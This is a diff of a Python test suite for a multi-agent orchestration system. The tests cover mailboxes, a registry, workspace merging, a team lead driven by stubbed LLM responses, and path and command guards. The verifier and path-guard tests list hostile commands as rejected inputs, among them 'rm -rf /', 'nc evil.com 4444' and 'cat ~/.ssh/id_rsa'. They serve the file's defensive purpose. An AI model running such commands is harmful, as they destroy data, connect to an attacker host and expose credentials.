@@ -2,6 +2,7 @@
 
 실제 claude CLI 호출 없이 (모든 LLM 호출 stub) 핵심 동작 검증.
 """
+
 from __future__ import annotations
 
 import json
@@ -15,16 +16,19 @@ from pathlib import Path
 sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
 
 from lead.mailbox import (
-    Message, append_message, parse_messages, scan_new,
-    next_msg_id, detect_terminal_status,
+    append_message,
+    detect_terminal_status,
+    next_msg_id,
+    parse_messages,
+    scan_new,
 )
 from lead.registry import AgentRegistry
-from lead.workspace import WorkspaceMerger
+from lead.team_lead import Goal, parse_plan, render_plan
 from lead.timeline import TimelineRenderer
-from lead.team_lead import parse_plan, render_plan, Goal
-
+from lead.workspace import WorkspaceMerger
 
 # ---------- mailbox ----------
+
 
 def test_mailbox_round_trip():
     with tempfile.TemporaryDirectory() as d:
@@ -79,6 +83,7 @@ def test_mailbox_skips_corrupted_blocks():
 
 # ---------- registry ----------
 
+
 def test_registry_register_and_status_flow():
     with tempfile.TemporaryDirectory() as d:
         lead = Path(d) / "lead"
@@ -102,10 +107,8 @@ def test_registry_rehydrate_from_disk():
         m1 = agents / "M001"
         m1.mkdir(parents=True)
         (m1 / "status").write_text("RUNNING")
-        append_message(m1 / "mailbox.md", from_="lead", to="M001",
-                       kind="instruction", body="seed")
-        append_message(m1 / "mailbox.md", from_="M001", to="lead",
-                       kind="status", body="working")
+        append_message(m1 / "mailbox.md", from_="lead", to="M001", kind="instruction", body="seed")
+        append_message(m1 / "mailbox.md", from_="M001", to="lead", kind="status", body="working")
 
         reg = AgentRegistry(lead, agents)
         # 인덱스 없었으니 rehydrate가 자동 호출됨
@@ -116,6 +119,7 @@ def test_registry_rehydrate_from_disk():
 
 
 # ---------- workspace ----------
+
 
 def test_workspace_clean_merge_copies_new_files():
     with tempfile.TemporaryDirectory() as d:
@@ -164,6 +168,7 @@ def test_workspace_conflict_stashes_and_reports():
 
 # ---------- timeline ----------
 
+
 def test_timeline_emit_and_render():
     with tempfile.TemporaryDirectory() as d:
         lead = Path(d) / "lead"
@@ -184,9 +189,14 @@ def test_timeline_emit_and_render():
         sd.mkdir(parents=True)
         events = [
             {"type": "system", "model": "opus"},
-            {"type": "assistant", "message": {"content": [
-                {"type": "tool_use", "name": "Edit", "input": {"file_path": "foo.py"}}
-            ]}},
+            {
+                "type": "assistant",
+                "message": {
+                    "content": [
+                        {"type": "tool_use", "name": "Edit", "input": {"file_path": "foo.py"}}
+                    ]
+                },
+            },
             {"type": "result", "is_error": False, "total_cost_usd": 0.1, "num_turns": 5},
         ]
         (sd / "stream.jsonl").write_text("\n".join(json.dumps(e) for e in events))
@@ -204,6 +214,7 @@ def test_timeline_emit_and_render():
 
 
 # ---------- team_lead.parse_plan ----------
+
 
 def test_parse_plan_round_trip():
     with tempfile.TemporaryDirectory() as d:
@@ -230,8 +241,10 @@ def test_parse_plan_round_trip():
 
 # ---------- team_lead integration (stubbed LLM + stubbed spawn) ----------
 
+
 class _FakeLLM:
     """순차 응답 큐. call(system, user, tier=...) 호출마다 다음 응답 반환."""
+
     def __init__(self, responses: list[str]):
         self.responses = list(responses)
         self.calls: list[tuple[str, str, str]] = []
@@ -277,7 +290,8 @@ def _make_team_lead(d: Path, llm, *, enable_evaluator: bool = False):
 
 def _stub_spawner(lead, spawn_results):
     """MemberSpawner.spawn을 큐에서 결과 반환하도록 패치 + ws/{agent_id}/에 실제 파일 생성."""
-    from lead.member import SpawnResult, HireBrief
+    from lead.member import HireBrief, SpawnResult
+
     queue = list(spawn_results)
     real_spawn = lead.spawner.spawn
 
@@ -304,15 +318,21 @@ def _stub_spawner(lead, spawn_results):
         # mailbox 메시지 append (멤버가 쓴 것처럼)
         for msg in result_spec.get("mailbox_appends", []):
             from lead.mailbox import append_message
+
             append_message(
                 agent_dir / "mailbox.md",
-                from_=brief.agent_id, to="lead",
-                kind=msg["kind"], body=msg["body"], ref=msg.get("ref"),
+                from_=brief.agent_id,
+                to="lead",
+                kind=msg["kind"],
+                body=msg["body"],
+                ref=msg.get("ref"),
             )
         return SpawnResult(
             agent_id=brief.agent_id,
             status=result_spec.get("status", "DONE"),
-            raw_output=result_spec.get("raw_output", f"work\n[STATUS:{result_spec.get('status','DONE')}]"),
+            raw_output=result_spec.get(
+                "raw_output", f"work\n[STATUS:{result_spec.get('status', 'DONE')}]"
+            ),
             delivery_text=result_spec.get("delivery", ""),
             error=result_spec.get("error", ""),
         )
@@ -324,20 +344,27 @@ def _stub_spawner(lead, spawn_results):
 def test_team_lead_full_cycle():
     """plan → hire(1 goal) → spawn(DONE) → verify(no checks) → merge → goal[x] → exit 0."""
     with tempfile.TemporaryDirectory() as d:
-        llm = _FakeLLM([
-            # _initial_plan
-            "# Plan\n- [ ] G-001-greet: hello.txt 만들기",
-            # _llm_hire_brief
-            '{"mission":"hello.txt 작성","deliverables":["hello.txt"],'
-            '"verification_checks":[],"system_prompt":"보조 엔지니어",'
-            '"allowed_tools":["Read","Write"]}',
-        ])
+        llm = _FakeLLM(
+            [
+                # _initial_plan
+                "# Plan\n- [ ] G-001-greet: hello.txt 만들기",
+                # _llm_hire_brief
+                '{"mission":"hello.txt 작성","kind":"new","deliverables":["hello.txt"],'
+                '"verification_checks":[],"system_prompt":"보조 엔지니어",'
+                '"allowed_tools":["Read","Write"]}',
+            ]
+        )
         lead = _make_team_lead(Path(d), llm)
-        _stub_spawner(lead, [{
-            "status": "DONE",
-            "files": {"hello.txt": "안녕\n"},
-            "delivery": "hello.txt 만들었음",
-        }])
+        _stub_spawner(
+            lead,
+            [
+                {
+                    "status": "DONE",
+                    "files": {"hello.txt": "안녕\n"},
+                    "delivery": "hello.txt 만들었음",
+                }
+            ],
+        )
         rc = lead.run()
         assert rc == 0, f"기대 0, 실제 {rc}"
 
@@ -361,33 +388,41 @@ def test_team_lead_full_cycle():
 def test_team_lead_question_reply_cycle():
     """첫 spawn WAITING+question → lead reply → 재spawn DONE → merge."""
     with tempfile.TemporaryDirectory() as d:
-        llm = _FakeLLM([
-            "# Plan\n- [ ] G-001-x: do x",
-            '{"mission":"X 작성","deliverables":["x.txt"],'
-            '"verification_checks":[],"system_prompt":"X 전문가",'
-            '"allowed_tools":["Write"]}',
-            "## Reply\nA 옵션 사용. legacy 건드리지 마.",  # _llm_reply
-        ])
+        llm = _FakeLLM(
+            [
+                "# Plan\n- [ ] G-001-x: do x",
+                '{"mission":"X 작성","kind":"new","deliverables":["x.txt"],'
+                '"verification_checks":[],"system_prompt":"X 전문가",'
+                '"allowed_tools":["Write"]}',
+                "## Reply\nA 옵션 사용. legacy 건드리지 마.",  # _llm_reply
+            ]
+        )
         lead = _make_team_lead(Path(d), llm)
-        _stub_spawner(lead, [
-            {
-                "status": "WAITING",
-                "mailbox_appends": [{
-                    "kind": "question",
-                    "body": "## Question\nA 옵션 vs B 옵션?",
-                }],
-            },
-            {
-                "status": "DONE",
-                "files": {"x.txt": "done"},
-                "delivery": "완료",
-            },
-        ])
+        _stub_spawner(
+            lead,
+            [
+                {
+                    "status": "WAITING",
+                    "mailbox_appends": [
+                        {
+                            "kind": "question",
+                            "body": "## Question\nA 옵션 vs B 옵션?",
+                        }
+                    ],
+                },
+                {
+                    "status": "DONE",
+                    "files": {"x.txt": "done"},
+                    "delivery": "완료",
+                },
+            ],
+        )
         rc = lead.run()
         assert rc == 0, f"기대 0, 실제 {rc}"
 
         # mailbox에 reply 작성됨
         from lead.mailbox import parse_messages
+
         msgs = parse_messages(Path(d) / "state/agents/M001/mailbox.md")
         kinds = [m.kind for m in msgs]
         assert "question" in kinds and "reply" in kinds
@@ -401,22 +436,27 @@ def test_team_lead_question_reply_cycle():
 def test_team_lead_parallel_hiring():
     """3개 goal, max_parallel=3. 모두 동시에 in-flight 진입해야 함 + 결국 모두 완료."""
     import threading
+
     with tempfile.TemporaryDirectory() as d:
-        llm = _FakeLLM([
-            # _initial_plan → 3 goals
-            "# Plan\n- [ ] G-001-a: A\n- [ ] G-002-b: B\n- [ ] G-003-c: C",
-            # 3개 hire_brief 응답 (한 tick에 3개 hire 시도)
-            '{"mission":"A","deliverables":["a.txt"],'
-            '"verification_checks":[],"system_prompt":"A worker","allowed_tools":["Write"]}',
-            '{"mission":"B","deliverables":["b.txt"],'
-            '"verification_checks":[],"system_prompt":"B worker","allowed_tools":["Write"]}',
-            '{"mission":"C","deliverables":["c.txt"],'
-            '"verification_checks":[],"system_prompt":"C worker","allowed_tools":["Write"]}',
-        ])
+        llm = _FakeLLM(
+            [
+                # _initial_plan → 3 goals
+                "# Plan\n- [ ] G-001-a: A\n- [ ] G-002-b: B\n- [ ] G-003-c: C",
+                # 3개 hire_brief 응답 (한 tick에 3개 hire 시도)
+                '{"mission":"A","kind":"new","deliverables":["a.txt"],'
+                '"verification_checks":[],"system_prompt":"A worker","allowed_tools":["Write"]}',
+                '{"mission":"B","kind":"new","deliverables":["b.txt"],'
+                '"verification_checks":[],"system_prompt":"B worker","allowed_tools":["Write"]}',
+                '{"mission":"C","kind":"new","deliverables":["c.txt"],'
+                '"verification_checks":[],"system_prompt":"C worker","allowed_tools":["Write"]}',
+            ]
+        )
         # max_parallel=3 으로 lead 생성
         from core.budget import BudgetLimits, BudgetManager
         from lead.team_lead import TeamLead
-        state = Path(d) / "state"; state.mkdir()
+
+        state = Path(d) / "state"
+        state.mkdir()
         ws_main = Path(d) / "ws" / "main"
         ws_root = Path(d) / "ws" / "members"  # 멤버들 부모
         budget = BudgetManager(
@@ -424,11 +464,16 @@ def test_team_lead_parallel_hiring():
             state / "budget.json",
         )
         lead = TeamLead(
-            spec="3개 파일 만들기", spec_name="spec.md",
+            spec="3개 파일 만들기",
+            spec_name="spec.md",
             state_dir=state,
-            lead_state_dir=state/"lead", agents_root=state/"agents",
-            session_logs_root=state/"session_logs", ws_root=ws_root,
-            ws_main=ws_main, llm=llm, budget=budget,
+            lead_state_dir=state / "lead",
+            agents_root=state / "agents",
+            session_logs_root=state / "session_logs",
+            ws_root=ws_root,
+            ws_main=ws_main,
+            llm=llm,
+            budget=budget,
             max_parallel=3,
         )
 
@@ -458,11 +503,15 @@ def test_team_lead_parallel_hiring():
             fname = f"{brief.agent_id.lower()}.txt"
             (ws / fname).write_text("done")
             from lead.member import SpawnResult
+
             with active_lock:
                 active["count"] -= 1
-            return SpawnResult(agent_id=brief.agent_id, status="DONE",
-                               raw_output=f"work\n[STATUS:DONE]",
-                               delivery_text="done")
+            return SpawnResult(
+                agent_id=brief.agent_id,
+                status="DONE",
+                raw_output="work\n[STATUS:DONE]",
+                delivery_text="done",
+            )
 
         lead.spawner.spawn = fake_spawn
 
@@ -471,7 +520,7 @@ def test_team_lead_parallel_hiring():
         assert active["peak"] == 3, f"동시 실행 peak={active['peak']}, 기대 3"
 
         # 모든 goal 체크
-        plan_text = (state/"lead"/"plan.md").read_text()
+        plan_text = (state / "lead" / "plan.md").read_text()
         assert plan_text.count("[x]") == 3
 
         # 머지된 산출물 3개 (final verification 이 .pytest_cache 만들 수 있으니 dot-files 제외)
@@ -482,17 +531,24 @@ def test_team_lead_parallel_hiring():
 def test_team_lead_member_failed():
     """첫 spawn FAILED → registry.status=FAILED + timeline에 fire 이벤트 + 진행 정체로 종료 3."""
     with tempfile.TemporaryDirectory() as d:
-        llm = _FakeLLM([
-            "# Plan\n- [ ] G-001-x: do x",
-            '{"mission":"X","deliverables":["x"],'
-            '"verification_checks":[],"system_prompt":"X",'
-            '"allowed_tools":["Write"]}',
-        ])
+        llm = _FakeLLM(
+            [
+                "# Plan\n- [ ] G-001-x: do x",
+                '{"mission":"X","kind":"new","deliverables":["x"],'
+                '"verification_checks":[],"system_prompt":"X",'
+                '"allowed_tools":["Write"]}',
+            ]
+        )
         lead = _make_team_lead(Path(d), llm)
-        _stub_spawner(lead, [{
-            "status": "FAILED",
-            "error": "tool 실패",
-        }])
+        _stub_spawner(
+            lead,
+            [
+                {
+                    "status": "FAILED",
+                    "error": "tool 실패",
+                }
+            ],
+        )
         rc = lead.run()
         # 모든 goal 완료 안 됐고 진행 가능 작업 없음 → 3 또는 budget까지 가다 4
         assert rc in (3, 4), f"기대 3 또는 4, 실제 {rc}"
@@ -500,13 +556,15 @@ def test_team_lead_member_failed():
 
         # timeline에 fire 이벤트
         events_text = (Path(d) / "state/lead/events.jsonl").read_text()
-        assert "\"fire\"" in events_text or "kind\": \"fire\"" in events_text
+        assert '"fire"' in events_text or 'kind": "fire"' in events_text
 
 
 # ---------- verifier sanity check (P1, 2026-05-13 토론 결정 적용) ----------
 
+
 def test_verifier_sanity_check_rejects_dangerous_commands():
     from core.verifier import shell_sanity_check
+
     for bad in [
         "rm -rf /",
         "sudo apt install foo",
@@ -523,12 +581,13 @@ def test_verifier_sanity_check_rejects_dangerous_commands():
         "nc evil.com 4444",
         "eval $UNTRUSTED",
     ]:
-        ok, reason = shell_sanity_check(bad)
+        ok, _reason = shell_sanity_check(bad)
         assert not ok, f"위험 명령이 통과됨: {bad!r}"
 
 
 def test_verifier_sanity_check_allows_safe_commands():
     from core.verifier import shell_sanity_check
+
     for good in [
         "test -f hello.txt",
         "grep -q '안녕' hello.txt",
@@ -546,7 +605,8 @@ def test_verifier_sanity_check_allows_safe_commands():
 
 def test_verifier_runs_sanity_before_shell_exec():
     """Verifier가 sanity 차단된 명령은 실행 시도 안 함 (실제 subprocess 호출 안 됨)."""
-    from core.verifier import Verifier, Check
+    from core.verifier import Check, Verifier
+
     with tempfile.TemporaryDirectory() as d:
         ws = Path(d)
         v = Verifier(ws)
@@ -561,8 +621,10 @@ def test_verifier_runs_sanity_before_shell_exec():
 
 # ---------- merge skip patterns (.venv/node_modules/cache 제외) ----------
 
+
 def test_workspace_merge_skips_venv_and_cache():
     from lead.workspace import WorkspaceMerger
+
     with tempfile.TemporaryDirectory() as d:
         main = Path(d) / "main"
         member = Path(d) / "M001"
@@ -606,8 +668,10 @@ def test_workspace_merge_skips_venv_and_cache():
 
 # ---------- path_guard (P5, 2026-05-13 토론 결정 적용) ----------
 
+
 def test_path_guard_rejects_absolute_and_traversal():
-    from core.path_guard import resolve_safe, PathEscape
+    from core.path_guard import PathEscape, resolve_safe
+
     with tempfile.TemporaryDirectory() as d:
         ws = Path(d) / "ws"
         (ws / "M001").mkdir(parents=True)
@@ -617,8 +681,7 @@ def test_path_guard_rejects_absolute_and_traversal():
         assert str(ok).startswith(str((ws / "M001").resolve()))
 
         # 거부 케이스
-        for bad in ["/etc/passwd", "~/.ssh/id_rsa", "../../etc",
-                    "../escape", "../../"]:
+        for bad in ["/etc/passwd", "~/.ssh/id_rsa", "../../etc", "../escape", "../../"]:
             try:
                 resolve_safe(bad, agent_id="M001", ws_root=ws)
                 raise AssertionError(f"escape 통과됨: {bad!r}")
@@ -628,7 +691,9 @@ def test_path_guard_rejects_absolute_and_traversal():
 
 def test_path_guard_rejects_symlinks():
     import os
-    from core.path_guard import resolve_safe, PathEscape
+
+    from core.path_guard import PathEscape, resolve_safe
+
     with tempfile.TemporaryDirectory() as d:
         ws = Path(d) / "ws"
         (ws / "M001").mkdir(parents=True)
@@ -646,6 +711,7 @@ def test_path_guard_rejects_symlinks():
 
 def test_host_path_blocked_detects_sensitive_paths():
     from core.path_guard import host_path_blocked
+
     for bad in [
         "cat ~/.ssh/id_rsa",
         "grep token .aws/credentials",
@@ -667,6 +733,7 @@ def test_host_path_blocked_detects_sensitive_paths():
 def test_verifier_sanity_blocks_host_paths():
     """verifier가 .ssh / .env / .aws 같은 호스트 민감 경로도 차단."""
     from core.verifier import shell_sanity_check
+
     for bad in ["cat ~/.ssh/id_rsa", "grep AWS .aws/credentials", "test -f .env"]:
         ok, _ = shell_sanity_check(bad)
         assert not ok, f"호스트 경로 통과: {bad!r}"
@@ -674,8 +741,10 @@ def test_verifier_sanity_blocks_host_paths():
 
 # ---------- code_janitor ----------
 
+
 def test_code_janitor_archives_unused_only():
     from agents.janitor.code_janitor import CodeJanitor
+
     with tempfile.TemporaryDirectory() as d:
         ws = Path(d)
         (ws / "helper.py").write_text("def add(a, b):\n    return a + b\n")
@@ -698,6 +767,7 @@ def test_code_janitor_archives_unused_only():
 def test_code_janitor_archives_empty_placeholder_dir():
     """trivial __init__.py 만 있고 외부 import 없는 디렉토리는 archive 된다 (infra/ 같은 경우)."""
     from agents.janitor.code_janitor import CodeJanitor
+
     with tempfile.TemporaryDirectory() as d:
         ws = Path(d)
         # 활성 코드
@@ -712,13 +782,16 @@ def test_code_janitor_archives_empty_placeholder_dir():
         # 모든 파일 mtime 을 과거로
         old = time.time() - 30 * 86400
         for p in ws.rglob("*"):
-            try: os.utime(p, (old, old))
-            except OSError: pass
+            try:
+                os.utime(p, (old, old))
+            except OSError:
+                pass
 
         rep = CodeJanitor(ws, entrypoints=["main.py"]).run()
         # infra 가 빈 placeholder 로 인식돼서 archive
-        assert any("infra" in s for s in rep.archived_dead_dirs), \
+        assert any("infra" in s for s in rep.archived_dead_dirs), (
             f"기대: infra archive, 실제 archived_dead_dirs={rep.archived_dead_dirs}"
+        )
         # pkg/ 자체는 archive 안 됨 (core.py 가 import 되니까 외부 사용 있음)
         assert not any(s == "pkg" for s in rep.archived_dead_dirs)
         # archive 디렉토리 내 REPORT 에 dead dir 언급
@@ -730,6 +803,7 @@ def test_code_janitor_archives_empty_placeholder_dir():
 def test_code_janitor_keeps_dir_when_module_imported():
     """trivial __init__.py 만 있어도 외부에서 그 모듈을 import 하면 keep."""
     from agents.janitor.code_janitor import CodeJanitor
+
     with tempfile.TemporaryDirectory() as d:
         ws = Path(d)
         (ws / "pkg").mkdir()
@@ -741,17 +815,21 @@ def test_code_janitor_keeps_dir_when_module_imported():
         (ws / "user.py").write_text("from pkg.sub import nothing  # noqa\n")
         old = time.time() - 30 * 86400
         for p in ws.rglob("*"):
-            try: os.utime(p, (old, old))
-            except OSError: pass
+            try:
+                os.utime(p, (old, old))
+            except OSError:
+                pass
 
         rep = CodeJanitor(ws, entrypoints=["user.py"]).run()
         # sub 는 외부 import 있어서 archive 안 됨
-        assert not any("sub" in s for s in rep.archived_dead_dirs), \
+        assert not any("sub" in s for s in rep.archived_dead_dirs), (
             f"keep 예상, 실제 archived={rep.archived_dead_dirs}"
+        )
 
 
 def test_code_janitor_skips_recent_files():
     from agents.janitor.code_janitor import CodeJanitor
+
     with tempfile.TemporaryDirectory() as d:
         ws = Path(d)
         (ws / "fresh_orphan.py").write_text("def x(): pass\n")  # 새 파일
@@ -764,9 +842,11 @@ def test_code_janitor_skips_recent_files():
 
 # ---------- 새 기능 회귀 테스트 (2026-05-14) ----------
 
+
 def test_workspace_binary_conflict_skipped_not_debated():
     """바이너리 파일 충돌은 conflicts 가 아니라 skipped_pattern 으로 분류 (debate 안 함)."""
     from lead.workspace import WorkspaceMerger
+
     with tempfile.TemporaryDirectory() as d:
         main = Path(d) / "main"
         member = Path(d) / "M001"
@@ -783,7 +863,9 @@ def test_workspace_binary_conflict_skipped_not_debated():
         merger = WorkspaceMerger(main, conflicts)
         rep = merger.merge(member, "M001")
         # binary 는 skipped_pattern 에 (binary) 표기
-        assert any("data.bin" in s and "binary" in s for s in rep.skipped_pattern), rep.skipped_pattern
+        assert any("data.bin" in s and "binary" in s for s in rep.skipped_pattern), (
+            rep.skipped_pattern
+        )
         assert "data.bin" not in rep.conflicts
         # text 는 conflict 정상
         assert "text.txt" in rep.conflicts
@@ -812,9 +894,7 @@ def test_team_lead_recovers_zombies_without_delivery_unassigns():
         lead = _make_team_lead(Path(d), llm)
         # plan.md 미리 작성 (zombie 가 assigned)
         lead.plan_md.parent.mkdir(parents=True, exist_ok=True)
-        lead.plan_md.write_text(
-            "# Plan\n- [ ] G-001-x: do x (assigned: M999)\n"
-        )
+        lead.plan_md.write_text("# Plan\n- [ ] G-001-x: do x (assigned: M999)\n")
         agent_dir = lead.agents_root / "M999"
         agent_dir.mkdir(parents=True)
         lead.registry.register("M999", goal_id="G-001-x")
@@ -831,11 +911,13 @@ def test_team_lead_recovers_zombies_without_delivery_unassigns():
 def test_team_lead_failed_member_unassigns_plan():
     """spawn FAILED → registry FAILED + plan 에서 unassign 자동."""
     with tempfile.TemporaryDirectory() as d:
-        llm = _FakeLLM([
-            "# Plan\n- [ ] G-001-x: do x",
-            '{"mission":"X","deliverables":["x"],'
-            '"verification_checks":[],"system_prompt":"X","allowed_tools":["Write"]}',
-        ])
+        llm = _FakeLLM(
+            [
+                "# Plan\n- [ ] G-001-x: do x",
+                '{"mission":"X","kind":"new","deliverables":["x"],'
+                '"verification_checks":[],"system_prompt":"X","allowed_tools":["Write"]}',
+            ]
+        )
         lead = _make_team_lead(Path(d), llm)
         _stub_spawner(lead, [{"status": "FAILED", "error": "boom"}])
         lead.run()
@@ -882,27 +964,41 @@ def test_timeline_skips_rerender_when_no_input_changed():
 
 def test_spawn_error_without_token_marks_failed_not_waiting():
     """SessionResult.success=False + [STATUS] 토큰 없음 → FAILED (mid-run 좀비 방지)."""
-    from lead.member import HireBrief, MemberSpawner
     from core.session_manager import SessionResult
+    from lead.member import HireBrief, MemberSpawner
+
     with tempfile.TemporaryDirectory() as d:
         d = Path(d)
         agents = d / "agents"
         ws = d / "ws"
         sp = MemberSpawner(agents, ws, d / "state", default_model="opus")
         brief = HireBrief(
-            agent_id="M001", goal_id="G-x", mission="m",
-            deliverables=[], verification_checks=[],
-            system_prompt="p", allowed_tools=["Write"],
+            agent_id="M001",
+            goal_id="G-x",
+            mission="m",
+            deliverables=[],
+            verification_checks=[],
+            system_prompt="p",
+            allowed_tools=["Write"],
         )
         sp.write_brief(brief)
 
         # SessionManager.run 을 monkey-patch — error 세션 시뮬레이션
         class _FakeSM:
-            def __init__(self, *a, **kw): pass
+            def __init__(self, *a, **kw):
+                pass
+
             def run(self, **kw):
-                return SessionResult(success=False, output="", error="max_turns reached",
-                                      session_id="s-abc", cost_usd=1.23)
+                return SessionResult(
+                    success=False,
+                    output="",
+                    error="max_turns reached",
+                    session_id="s-abc",
+                    cost_usd=1.23,
+                )
+
         import lead.member as mm
+
         orig = mm.SessionManager
         mm.SessionManager = _FakeSM
         try:
@@ -919,7 +1015,9 @@ def test_spawn_error_without_token_marks_failed_not_waiting():
 def test_spawn_default_max_turns_is_120():
     """max_turns 기본값 120 — 복잡 goal 위한 여유."""
     import inspect
+
     from lead.member import MemberSpawner
+
     sig = inspect.signature(MemberSpawner.spawn)
     assert sig.parameters["max_turns"].default == 120
 
@@ -927,21 +1025,30 @@ def test_spawn_default_max_turns_is_120():
 def test_replan_archives_old_plan_and_redecomposes():
     """replan=True 로 시작하면 기존 plan.md 가 archive 되고 새 spec 으로 재분해."""
     with tempfile.TemporaryDirectory() as d:
-        llm = _FakeLLM([
-            "# Plan\n- [ ] G-NEW-001-foo: new goal",  # initial_plan 응답
-            '{"mission":"foo","deliverables":["foo.txt"],'
-            '"verification_checks":[],"system_prompt":"foo worker",'
-            '"allowed_tools":["Write"]}',
-        ])
+        llm = _FakeLLM(
+            [
+                "# Plan\n- [ ] G-NEW-001-foo: new goal",  # initial_plan 응답
+                '{"mission":"foo","kind":"new","deliverables":["foo.txt"],'
+                '"verification_checks":[],"system_prompt":"foo worker",'
+                '"allowed_tools":["Write"]}',
+            ]
+        )
         lead = _make_team_lead(Path(d), llm)
         # 기존 plan.md 가 있는 상태 (이미 done 된 것처럼)
         lead.plan_md.parent.mkdir(parents=True, exist_ok=True)
         lead.plan_md.write_text("# Plan\n- [x] G-OLD-001-done: 이전\n")
         # replan flag 켜기 + 한 번 spawn DONE 으로 끝나도록 stub
         lead.replan = True
-        _stub_spawner(lead, [{
-            "status": "DONE", "files": {"foo.txt": "ok"}, "delivery": "done",
-        }])
+        _stub_spawner(
+            lead,
+            [
+                {
+                    "status": "DONE",
+                    "files": {"foo.txt": "ok"},
+                    "delivery": "done",
+                }
+            ],
+        )
         rc = lead.run()
         # 신규 plan 으로 재분해됐는지 (G-NEW-001 이 있고 archived plan.replaced-* 파일이 있음)
         assert "G-NEW-001-foo" in lead.plan_md.read_text()
@@ -954,10 +1061,12 @@ def test_replan_archives_old_plan_and_redecomposes():
 def test_initial_plan_prompt_receives_ws_main_tree():
     """_initial_plan 이 ws_main_tree 를 render_split 에 전달."""
     captured = {}
+
     class _CaptureLLM:
         def call(self, system, user, **kw):
             captured["user"] = user
             return "# Plan\n- [ ] G-001-x: hello"
+
     with tempfile.TemporaryDirectory() as d:
         lead = _make_team_lead(Path(d), _CaptureLLM())
         # ws/main 에 파일 하나 만들어두기 (ws_main_tree 가 거기서 뽑아야 함)
@@ -966,8 +1075,9 @@ def test_initial_plan_prompt_receives_ws_main_tree():
         lead._initial_plan()
         # render_split 의 user prompt 안에 ws/main 트리 + 분해 규칙 단어들이 보여야 함
         assert "src/pkg/mod.py" in captured["user"], "ws_main_tree 가 prompt 에 안 들어감"
-        assert "기존" in captured["user"] or "재사용" in captured["user"], \
+        assert "기존" in captured["user"] or "재사용" in captured["user"], (
             "분해 규칙 안내가 prompt 에 없음"
+        )
 
 
 def test_final_verification_passes_when_pytest_returns_zero():
@@ -985,9 +1095,7 @@ def test_final_verification_fails_when_pytest_returns_nonzero():
     with tempfile.TemporaryDirectory() as d:
         lead = _make_team_lead(Path(d), _FakeLLM([]))
         (lead.ws_main / "tests").mkdir(parents=True)
-        (lead.ws_main / "tests" / "test_fail.py").write_text(
-            "def test_broken(): assert 1 == 2\n"
-        )
+        (lead.ws_main / "tests" / "test_fail.py").write_text("def test_broken(): assert 1 == 2\n")
         passed, output = lead._final_verification()
         assert passed is False
         assert "test_broken" in output or "FAIL" in output
@@ -997,10 +1105,12 @@ def test_add_fix_goals_from_failures_parses_llm_json():
     """LLM 이 JSON 배열로 fix goal 들 반환하면 plan.md 에 추가."""
     with tempfile.TemporaryDirectory() as d:
         # LLM 응답: 2개 fix goal
-        llm = _FakeLLM([
-            '[{"id":"G-FIX-001-import","title":"import 누락 수정"},'
-            ' {"id":"G-FIX-002-typo","title":"typo 수정"}]'
-        ])
+        llm = _FakeLLM(
+            [
+                '[{"id":"G-FIX-001-import","title":"import 누락 수정"},'
+                ' {"id":"G-FIX-002-typo","title":"typo 수정"}]'
+            ]
+        )
         lead = _make_team_lead(Path(d), llm)
         lead.plan_md.write_text("# Plan\n- [x] G-001-x: existing\n")
         added = lead._add_fix_goals_from_failures("FAIL: test_foo")
@@ -1014,9 +1124,7 @@ def test_add_fix_goals_from_failures_parses_llm_json():
 def test_add_fix_goals_ignores_duplicate_ids():
     """이미 plan 에 있는 id 는 추가 안 함."""
     with tempfile.TemporaryDirectory() as d:
-        llm = _FakeLLM([
-            '[{"id":"G-001-x","title":"중복"},{"id":"G-FIX-001-new","title":"신규"}]'
-        ])
+        llm = _FakeLLM(['[{"id":"G-001-x","title":"중복"},{"id":"G-FIX-001-new","title":"신규"}]'])
         lead = _make_team_lead(Path(d), llm)
         lead.plan_md.write_text("# Plan\n- [x] G-001-x: existing\n")
         added = lead._add_fix_goals_from_failures("...")
@@ -1025,9 +1133,11 @@ def test_add_fix_goals_ignores_duplicate_ids():
 
 def test_high_stakes_fallback_returns_true_for_debate_bias():
     """판정 LLM 실패 시 fallback 은 True (토론 쪽) — 사용자 정책: 애매하면 토론."""
+
     class _BrokenLLM:
         def call(self, *a, **kw):
             raise RuntimeError("simulated llm failure")
+
     with tempfile.TemporaryDirectory() as d:
         lead = _make_team_lead(Path(d), _BrokenLLM())
         result = lead._is_high_stakes_question("뭔가 복잡한 질문?")
@@ -1036,9 +1146,11 @@ def test_high_stakes_fallback_returns_true_for_debate_bias():
 
 def test_high_stakes_prompt_biases_toward_debate():
     """prompt 가 'high_stakes=true' default 명시 + 단순 lookup 만 false 라고 안내."""
-    from lead.team_lead import TeamLead
     # _is_high_stakes_question 내부 system/user 문자열에 정책 키워드가 있는지 직접 검사
     import inspect
+
+    from lead.team_lead import TeamLead
+
     src = inspect.getsource(TeamLead._is_high_stakes_question)
     # 핵심 정책 어구
     assert "기본은 high_stakes=true" in src
@@ -1062,14 +1174,485 @@ def test_agent_record_has_cost_and_session_id():
         assert reg.get("M001").cost_usd == 1.2
 
 
+# ---------- refine write-guard (kind=='refine' closure 합성) ----------
+
+
+def test_member_refine_brief_appends_write_guard_to_system_prompt():
+    """brief.kind == 'refine' 이면 _compose_system_prompt 가 가드를 append (시드 파일 bullet 포함)."""
+    from lead.member import HireBrief, MemberSpawner
+
+    with tempfile.TemporaryDirectory() as d:
+        d = Path(d)
+        sp = MemberSpawner(d / "agents", d / "ws", d / "state")
+        brief = HireBrief(
+            agent_id="M001",
+            goal_id="G-x",
+            mission="m",
+            deliverables=[],
+            verification_checks=[],
+            system_prompt="원래 페르소나 — 정련 전문가.",
+            seed_files=["agent_system/lead/member.py", "agent_system/lead/prompts/__init__.py"],
+            allowed_tools=["Read", "Write", "Edit"],
+            kind="refine",
+        )
+        composed = sp._compose_system_prompt(brief)
+        # 원본 보존 + 가드 합성 + 시드 파일 bullet
+        assert "원래 페르소나" in composed
+        assert "Write" in composed and "Edit" in composed
+        assert "agent_system/lead/member.py" in composed
+
+
+# ---------- 새 기능 회귀 테스트 (2026-05-14, decomposer kind 라벨 강화) ----------
+
+
+def test_ws_main_summary_includes_module_docstring_first_line():
+    """_ws_main_summary 가 .py 파일별 모듈 docstring 첫 줄을 한 줄에 함께 노출."""
+    with tempfile.TemporaryDirectory() as d:
+        llm = _FakeLLM([])
+        lead = _make_team_lead(Path(d), llm)
+        (lead.ws_main / "src").mkdir(parents=True)
+        (lead.ws_main / "src" / "with_doc.py").write_text(
+            '"""모듈 첫 줄 설명.\n\n자세한 설명은 본문에서 다룸."""\nx = 1\n'
+        )
+        (lead.ws_main / "src" / "no_doc.py").write_text("y = 2\n")
